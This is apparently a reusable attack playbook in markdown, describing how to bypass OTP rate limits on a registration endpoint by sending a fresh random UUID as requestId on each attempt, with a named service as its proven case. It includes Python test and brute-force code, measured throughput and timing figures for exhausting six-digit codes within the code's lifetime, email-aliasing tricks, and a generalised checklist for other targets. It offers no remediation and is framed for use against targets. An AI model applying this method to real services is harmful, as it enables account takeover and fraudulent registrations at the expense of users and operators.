# OTP Rate Limit Bypass via RequestId Manipulation

## When to Use
- Target has OTP/verification code with per-attempt rate limit
- Registration or password reset requires email verification code
- Rate limit message mentions "exceeded limit of verification time"

## Pattern: Random UUID RequestId Bypass (AntGroup GenAI Cockpit, June 2026)

### Discovery Flow
1. Rate limit error: "max verify code limit times is 10" per requestId
2. Test: does the system validate requestId exists? → NO, arbitrary UUIDs accepted
3. Test: is requestId bound to specific email? → NO, cross-email reuse works
4. Result: unlimited brute-force using random UUID as requestId each attempt

### Key Tests (run in order)

```python
import uuid

# Test 1: Does fake requestId pass validation?
r = s.post(f"{BASE}/register", json={
    "loginId": "target@email.com",
    "verifyCode": "123456",
    "requestId": str(uuid.uuid4()),  # random UUID
    ...
})
# If "verify code can not be used" (not "invalid requestId") → BYPASS WORKS

# Test 2: Is requestId bound to the email?
# Send code to email A, use requestId from email B to register email A
r = s.post(f"{BASE}/sendVerifyCode", json={"loginId": "emailB+99@host.com"})
req_id_b = r.json()['data']['requestId']
r = s.post(f"{BASE}/register", json={
    "loginId": "emailA@host.com",
    "verifyCode": "111111",
    "requestId": req_id_b,  # from different email
    ...
})
# If "verify code can not be used" (reaches code validation) → NOT BOUND

# Test 3: Unlimited attempts with random UUIDs
for i in range(50):
    r = s.post(f"{BASE}/register", json={
        "requestId": str(uuid.uuid4()),  # fresh UUID each time
        "verifyCode": f"{i:06d}",
        ...
    })
    # If no "exceeded" error after 50 attempts → NO RATE LIMIT
```

### Full Brute-Force Parameters (proven)
- **Rate achieved:** 190 req/s with 10 threads, single IP
- **Code space:** 6-digit = 1,000,000 possibilities
- **Time to exhaust:** ~82 minutes at 190/s
- **OTP TTL observed:** 40-80 minutes (code valid at 40 min, expired by 82 min)
- **IP blocking:** NONE on register endpoint (930K attempts, zero blocks)
- **CAPTCHA:** NONE

### Attack Optimization
- Start brute-force IMMEDIATELY after sendVerifyCode (maximize TTL window)
- Use 10+ threads for ~190 req/s throughput
- Random UUID per request = no per-requestId rate limit
- Single-threaded = ~20/s (too slow for 6-digit in TTL)
- If code is 4-digit (10K codes): completes in <60s at 190/s

### Related Bypasses Found
- **+addressing:** `user+1@host.com` treated as separate email (separate rate limits)
- **Dot variation:** `u.ser@host.com` vs `user@host.com` treated as different
- **Case normalization:** `User@host.com` normalized to `user@host.com` (no bypass)
- **sendVerifyCode IP limit:** ~7000 calls before IP-level block (NOT bypassable via headers)
- **Register IP limit:** NONE (930K+ proven)

### Pitfall: Code Expiry
The OTP has a finite TTL (observed: 40-80 min on AntGroup). If brute-force takes longer than TTL, the code expires silently (same "can not be used" error). Solution:
- Estimate TTL by testing old codes periodically
- If TTL < full-brute-time, need faster rate or shorter code
- At 190/s: covers 684K codes in 60 min window

## Generalized Pattern

Many OTP systems have rate limits tied to a "session" or "request" identifier rather than the account being registered. Test:
1. Is the identifier validated (must exist in DB)?
2. Is the identifier bound to the target account?
3. Is the rate limit per-identifier or per-account or per-IP?

If #1 is NO → unlimited brute with fake identifiers
If #1 is YES but #2 is NO → generate identifiers from other accounts
If per-identifier only → rotate identifiers for fresh limits
